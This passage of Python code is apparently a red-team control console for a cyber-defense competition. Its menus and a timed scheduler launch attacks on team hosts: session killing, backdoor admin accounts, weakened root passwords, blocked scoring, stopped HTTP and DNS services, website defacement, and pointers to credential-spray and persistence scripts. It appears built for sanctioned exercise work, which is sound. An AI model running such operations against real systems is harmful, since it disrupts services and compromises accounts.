  \033[1;36m[7]\033[0m  Chaos Mode (End of Competition)
  \033[1;36m[8]\033[0m  Schedule Manager
  \033[1;36m[9]\033[0m  View Action Log
  \033[1;36m[R]\033[0m  Revert Actions
  \033[1;36m[S]\033[0m  Status Dashboard
  \033[1;36m[Q]\033[0m  Quit
\033[1;33m╚════════════════════════════════════════════════════════════╝\033[0m
""")
    
    def print_user_management_menu(self):
        """Print user management submenu"""
        print("""
\033[1;33m╔════════════════════════════════════════════════════════════╗
║                  USER MANAGEMENT                           ║
╠════════════════════════════════════════════════════════════╣\033[0m
  \033[1;36m[1]\033[0m  Kill User Sessions (pkill non-redteam users)
  \033[1;36m[2]\033[0m  Create Themed Users (turret, companion, atlas, etc.)
  \033[1;36m[3]\033[0m  Create GLaDOS Admin Account
  \033[1;36m[4]\033[0m  Weaken Root/Admin Password
  \033[1;36m[5]\033[0m  Remove Themed Users (Revert)
  \033[1;36m[B]\033[0m  Back to Main Menu
\033[1;33m╚════════════════════════════════════════════════════════════╝\033[0m
""")
    
    def print_service_menu(self):
        """Print service degradation submenu"""
        print("""
\033[1;33m╔════════════════════════════════════════════════════════════╗
║               SERVICE DEGRADATION                          ║
╠════════════════════════════════════════════════════════════╣\033[0m
  \033[1;36m[1]\033[0m  Block Scoring Engine (Firewall)
  \033[1;36m[2]\033[0m  Unblock Scoring Engine (Revert)
  \033[1;36m[3]\033[0m  Stop HTTP Services
  \033[1;36m[4]\033[0m  Start HTTP Services (Revert)
  \033[1;36m[5]\033[0m  Stop DNS Services
  \033[1;36m[6]\033[0m  Start DNS Services (Revert)
  \033[1;36m[B]\033[0m  Back to Main Menu
\033[1;33m╚════════════════════════════════════════════════════════════╝\033[0m
""")
    
    def print_chaos_menu(self):
        """Print chaos mode submenu"""
        print("""
\033[1;33m╔════════════════════════════════════════════════════════════╗
║              🎉 CHAOS MODE 🎉                              ║
║         (For End of Competition Fun!)                      ║
╠════════════════════════════════════════════════════════════╣\033[0m
  \033[1;36m[1]\033[0m  Deploy Nyan Cat
  \033[1;36m[3]\033[0m  Deploy Matrix Rain
  \033[1;36m[4]\033[0m  Deploy Desktop Goose (Wall Spam)
  \033[1;36m[5]\033[0m  Deploy ALL Chaos
  \033[1;36m[6]\033[0m  Remove All Chaos (Revert)
  \033[1;36m[B]\033[0m  Back to Main Menu
\033[1;33m╚════════════════════════════════════════════════════════════╝\033[0m
""")
    
    def print_defacement_menu(self):
        """Print defacement submenu"""
        print("""
\033[1;33m╔════════════════════════════════════════════════════════════╗
║              WEBSITE DEFACEMENT                            ║
╠════════════════════════════════════════════════════════════╣\033[0m
  \033[1;36m[1]\033[0m  Deface PrestaShop (with backup)
  \033[1;36m[2]\033[0m  Restore PrestaShop (Revert)
  \033[1;36m[B]\033[0m  Back to Main Menu
\033[1;33m╚════════════════════════════════════════════════════════════╝\033[0m
""")
    
    def print_schedule_menu(self):
        """Print schedule manager submenu"""
        print("""
\033[1;33m╔════════════════════════════════════════════════════════════╗
║              SCHEDULE MANAGER                              ║
╠════════════════════════════════════════════════════════════╣\033[0m
  \033[1;36m[1]\033[0m  View Current Schedule
  \033[1;36m[2]\033[0m  Load Standard Competition Schedule
  \033[1;36m[3]\033[0m  Add Scheduled Action
  \033[1;36m[4]\033[0m  Clear Schedule
  \033[1;36m[5]\033[0m  Start Scheduler
  \033[1;36m[6]\033[0m  Stop Scheduler
  \033[1;36m[B]\033[0m  Back to Main Menu
\033[1;33m╚════════════════════════════════════════════════════════════╝\033[0m
""")
    
    def select_targets(self) -> List[str]:
        """Interactive target selection"""
        print("\n\033[1;36mSelect targets:\033[0m")
        print("  [A] All in-scope targets")
        print("  [L] Linux only")
        print("  [W] Windows only")
        print("  [C] Custom selection")
        
        choice = input("\nChoice: ").strip().upper()
        
        if choice == 'A':
            return [t.hostname for t in TARGETS]
        elif choice == 'L':
            return [t.hostname for t in TARGETS if t.os_type == "linux"]
        elif choice == 'W':
            return [t.hostname for t in TARGETS if t.os_type == "windows"]
        elif choice == 'C':
            print("\nAvailable targets:")
            for i, t in enumerate(TARGETS):
                print(f"  [{i}] {t.hostname} ({t.os_type})")
            indices = input("Enter indices (comma-separated): ").strip()
            selected = []
            for idx in indices.split(','):
                try:
                    selected.append(TARGETS[int(idx.strip())].hostname)
                except:
                    pass
            return selected
        else:
            return [t.hostname for t in TARGETS]
    
    def run_user_management(self):
        """User management submenu"""
        while True:
            self.print_user_management_menu()
            choice = input("Choice: ").strip().upper()
            
            if choice == '1':
                targets = self.select_targets()
                print("\n\033[1;33mKilling user sessions...\033[0m")
                results = self.attacks.pkill_users(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '2':
                targets = self.select_targets()
                print("\n\033[1;33mCreating themed users...\033[0m")
                results = self.attacks.create_themed_users(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '3':
                targets = self.select_targets()
                print("\n\033[1;33mCreating GLaDOS admin account...\033[0m")
                results = self.attacks.create_glados_admin(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '4':
                confirm = input("\033[1;31mWARNING: This changes root password! Continue? (yes/no): \033[0m")
                if confirm.lower() == 'yes':
                    targets = self.select_targets()
                    print("\n\033[1;33mWeakening root password...\033[0m")
                    results = self.attacks.weaken_root_password(targets)
                    print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                    
            elif choice == '5':
                targets = self.select_targets()
                print("\n\033[1;33mRemoving themed users...\033[0m")
                results = self.attacks.remove_themed_users(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == 'B':
                break
            
            input("\nPress Enter to continue...")
    
    def run_service_degradation(self):
        """Service degradation submenu"""
        while True:
            self.print_service_menu()
            choice = input("Choice: ").strip().upper()
            
            if choice == '1':
                targets = self.select_targets()
                print("\n\033[1;33mBlocking scoring engine...\033[0m")
                results = self.attacks.block_scoring(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '2':
                targets = self.select_targets()
                print("\n\033[1;33mUnblocking scoring engine...\033[0m")
                results = self.attacks.unblock_scoring(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '3':
                targets = self.select_targets()
                print("\n\033[1;33mStopping HTTP services...\033[0m")
                results = self.attacks.stop_http(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '4':
                targets = self.select_targets()
                print("\n\033[1;33mStarting HTTP services...\033[0m")
                results = self.attacks.start_http(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '5':
                targets = self.select_targets()
                print("\n\033[1;33mStopping DNS services...\033[0m")
                results = self.attacks.stop_dns(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '6':
                targets = self.select_targets()
                print("\n\033[1;33mStarting DNS services...\033[0m")
                results = self.attacks.start_dns(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == 'B':
                break
            
            input("\nPress Enter to continue...")
    
    def run_chaos_mode(self):
        """Chaos mode submenu"""
        stage = self.state.get_current_stage()
        if stage != Stage.CHAOS:
            print("\n\033[1;31m WARNING: Not in CHAOS stage yet!\033[0m")
            confirm = input("Deploy chaos anyway? (yes/no): ")
            if confirm.lower() != 'yes':
                return
        
        while True:
            self.print_chaos_menu()
            choice = input("Choice: ").strip().upper()
            
            targets = [t.hostname for t in TARGETS if t.os_type == "linux"]
            
            if choice == '1':
                print("\n\033[1;33m Deploying Nyan Cat...\033[0m")
                results = self.chaos.deploy_nyan_cat(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '2':
                print("\n\033[1;33m Deploying Bee Movie...\033[0m")
                results = self.chaos.deploy_bee_movie(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '3':
                print("\n\033[1;33m Deploying Matrix Rain...\033[0m")
                results = self.chaos.deploy_matrix_rain(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '4':
                print("\n\033[1;33m Deploying Desktop Goose...\033[0m")
                results = self.chaos.deploy_desktop_goose_effect(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '5':
                print("\n\033[1;33m Deploying ALL Chaos...\033[0m")
                self.chaos.deploy_nyan_cat(targets)
                self.chaos.deploy_bee_movie(targets)
                self.chaos.deploy_matrix_rain(targets)
                self.chaos.deploy_desktop_goose_effect(targets)
                print("All chaos deployed!")
                
            elif choice == '6':
                print("\n\033[1;33m🧹 Removing all chaos...\033[0m")
                results = self.chaos.remove_chaos(targets)
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == 'B':
                break
            
            input("\nPress Enter to continue...")
    
    def run_defacement(self):
        """Defacement submenu"""
        while True:
            self.print_defacement_menu()
            choice = input("Choice: ").strip().upper()
            
            if choice == '1':
                print("\n\033[1;33mDefacing PrestaShop (with backup)...\033[0m")
                results = self.defacement.deface_prestashop()
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == '2':
                print("\n\033[1;33mRestoring PrestaShop...\033[0m")
                results = self.defacement.restore_prestashop()
                print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
                
            elif choice == 'B':
                break
            
            input("\nPress Enter to continue...")
    
    def view_action_log(self):
        """Display action log"""
        print("\n" + "="*70)
        print("\033[1;36mACTION LOG\033[0m")
        print("="*70)
        
        if not self.state.actions_log:
            print("  No actions logged yet.")
        else:
            for entry in self.state.actions_log[-20:]:  # Last 20
                timestamp = entry['timestamp'][:19]
                action = entry['action']
                teams = entry['teams']
                success = "✓" if entry['success'] else "✗"
                print(f"  [{timestamp}] {success} {action} - Teams: {teams}")
        
        print("="*70)
    
    def run_schedule_manager(self):
        """Schedule manager submenu"""
        while True:
            self.print_schedule_menu()
            choice = input("Choice: ").strip().upper()
            
            if choice == '1':
                print("\n\033[1;36mScheduled Actions:\033[0m")
                if not self.state.scheduled_actions:
                    print("  No actions scheduled.")
                else:
                    for i, action in enumerate(self.state.scheduled_actions):
                        print(f"  [{i}] {action['time']} - {action['action']} on {action['targets']}")
                        
            elif choice == '2':
                if not self.state.competition_start:
                    print("\033[1;31mStart competition timer first!\033[0m")
                else:
                    self.load_standard_schedule()
                    print("\033[1;32mStandard schedule loaded!\033[0m")
                    
            elif choice == '3':
                # Add custom scheduled action
                print("Available actions: block_scoring, unblock_scoring, stop_http, start_http, stop_dns, start_dns")
                action = input("Action name: ").strip()
                delay = int(input("Delay from now (minutes): "))
                targets = input("Targets (comma-separated, or 'all'): ").strip()
                
                if targets.lower() == 'all':
                    targets = [t.hostname for t in TARGETS]
                else:
                    targets = [t.strip() for t in targets.split(',')]
                
                scheduled_time = datetime.now() + timedelta(minutes=delay)
                self.state.scheduled_actions.append({
                    'time': scheduled_time.isoformat(),
                    'action': action,
                    'targets': targets,
                    'executed': False
                })
                self.state.save()
                print(f"Scheduled {action} for {scheduled_time.strftime('%H:%M:%S')}")
                
            elif choice == '4':
                self.state.scheduled_actions = []
                self.state.save()
                print("Schedule cleared.")
                
            elif choice == '5':
                if not self.scheduler_running:
                    self.start_scheduler()
                    print("\033[1;32mScheduler started!\033[0m")
                else:
                    print("Scheduler already running.")
                    
            elif choice == '6':
                self.stop_scheduler()
                print("\033[1;33mScheduler stopped.\033[0m")
                
            elif choice == 'B':
                break
            
            input("\nPress Enter to continue...")
    
    def load_standard_schedule(self):
        """Load standard competition attack schedule"""
        if not self.state.competition_start:
            return
        
        start = self.state.competition_start
        
        # Define schedule relative to competition start
        schedule = [
            # T+45min: Light service degradation
            (45, "stop_http", ["storage", "safety"]),
            (47, "start_http", ["storage", "safety"]),  # Auto-revert after 2 min
            
            # T+1h: Firewall attacks
            (60, "block_scoring", ["morality", "anger"]),
            (63, "unblock_scoring", ["morality", "anger"]),
            
            # T+1.5h: More service attacks
            (90, "stop_http", ["scalable", "cake"]),
            (95, "start_http", ["scalable", "cake"]),
            
            # T+2h: Config sabotage wave
            (120, "block_scoring", ["storage", "safety", "scalable"]),
            (125, "unblock_scoring", ["storage", "safety", "scalable"]),
            
            # T+2.5h: DNS attacks
            (150, "stop_dns", ["anger"]),
            (155, "start_dns", ["anger"]),
            
            # T+3h: Combined attack
            (180, "block_scoring", ["curiosity", "morality", "anger", "space"]),
            (185, "stop_http", ["storage", "safety"]),
            (188, "unblock_scoring", ["curiosity", "morality", "anger", "space"]),
            (190, "start_http", ["storage", "safety"]),
            
            # T+3.5h: Heavy pressure
            (210, "block_scoring", ["storage", "safety", "cake", "scalable"]),
            (215, "unblock_scoring", ["storage", "safety", "cake", "scalable"]),
            
            # T+4h: Chaos mode begins
            (240, "chaos_nyan", ["storage", "safety", "scalable", "cake"]),
        ]
        
        self.state.scheduled_actions = []
        for delay_min, action, targets in schedule:
            scheduled_time = start + timedelta(minutes=delay_min)
            self.state.scheduled_actions.append({
                'time': scheduled_time.isoformat(),
                'action': action,
                'targets': targets,
                'executed': False
            })
        
        self.state.save()
    
    def scheduler_loop(self):
        """Background scheduler loop"""
        while self.scheduler_running:
            now = datetime.now()
            
            for action in self.state.scheduled_actions:
                if action['executed']:
                    continue
                
                scheduled_time = datetime.fromisoformat(action['time'])
                if now >= scheduled_time:
                    logger.info(f"Executing scheduled action: {action['action']}")
                    self.execute_scheduled_action(action)
                    action['executed'] = True
                    self.state.save()
            
            time.sleep(10)  # Check every 10 seconds
    
    def execute_scheduled_action(self, action: Dict):
        """Execute a scheduled action"""
        action_name = action['action']
        targets = action['targets']
        
        action_map = {
            'block_scoring': lambda: self.attacks.block_scoring(targets),
            'unblock_scoring': lambda: self.attacks.unblock_scoring(targets),
            'stop_http': lambda: self.attacks.stop_http(targets),
            'start_http': lambda: self.attacks.start_http(targets),
            'stop_dns': lambda: self.attacks.stop_dns(targets),
            'start_dns': lambda: self.attacks.start_dns(targets),
            'chaos_nyan': lambda: self.chaos.deploy_nyan_cat(targets),
        }
        
        if action_name in action_map:
            action_map[action_name]()
    
    def start_scheduler(self):
        """Start the background scheduler"""
        if not self.scheduler_running:
            self.scheduler_running = True
            self.scheduler_thread = threading.Thread(target=self.scheduler_loop, daemon=True)
            self.scheduler_thread.start()
            logger.info("Scheduler started")
    
    def stop_scheduler(self):
        """Stop the background scheduler"""
        self.scheduler_running = False
        logger.info("Scheduler stopped")
    
    def run(self):
        """Main console loop"""
        self.print_banner()
        
        while True:
            try:
                self.print_status()
                self.print_main_menu()
                choice = input("Choice: ").strip().upper()
                
                if choice == '1':
                    self.state.competition_start = datetime.now()
                    self.state.save()
                    print(f"\n\033[1;32m🚀 Competition started at {self.state.competition_start.strftime('%H:%M:%S')}!\033[0m")
                    
                elif choice == '2':
                    print("\n\033[1;33mRunning credential spray...\033[0m")
                    print("Use: python3 enumeration/default_cred_spray.py --teams 1-12")
                    
                elif choice == '3':
                    print("\n\033[1;33mDeploying persistence...\033[0m")
                    print("Use: python3 orchestration/glados.py --full-attack --teams 1-12")
                    
                elif choice == '4':
                    self.run_user_management()
                    
                elif choice == '5':
                    self.run_service_degradation()
                    
                elif choice == '6':
                    self.run_defacement()
                    
                elif choice == '7':
                    self.run_chaos_mode()
                    
                elif choice == '8':
                    self.run_schedule_manager()
                    
                elif choice == '9':
                    self.view_action_log()
                    input("\nPress Enter to continue...")
                    
                elif choice == 'R':
                    print("\n\033[1;33mRevert options available in each submenu.\033[0m")
                    input("\nPress Enter to continue...")
                    
                elif choice == 'S':
                    self.print_status()
                    input("\nPress Enter to continue...")
                    
                elif choice == 'Q':
                    print("\n\033[1;33m\"Goodbye, test subject.\"\033[0m\n")
                    self.stop_scheduler()
                    break
                    
            except KeyboardInterrupt:
                print("\n\n\033[1;33mInterrupted. Use 'Q' to quit properly.\033[0m")
            except Exception as e:
                logger.error(f"Error: {e}")
                input("Press Enter to continue...")


# Main Entry Point


def main():
    parser = argparse.ArgumentParser(description="Aperture Science Red Team Console")
    parser.add_argument("--non-interactive", action="store_true", 
                        help="Run in non-interactive mode")
    parser.add_argument("--action", type=str, help="Action to run non-interactively")
    parser.add_argument("--teams", default="1-12", help="Team range")
    args = parser.parse_args()
    
    console = RedTeamConsole()
    
    if args.non_interactive and args.action:
        # Non-interactive mode for scripting
        print(f"Running action: {args.action}")
        # Add non-interactive action handling here
    else:
        console.run()

if __name__ == "__main__":
    main()
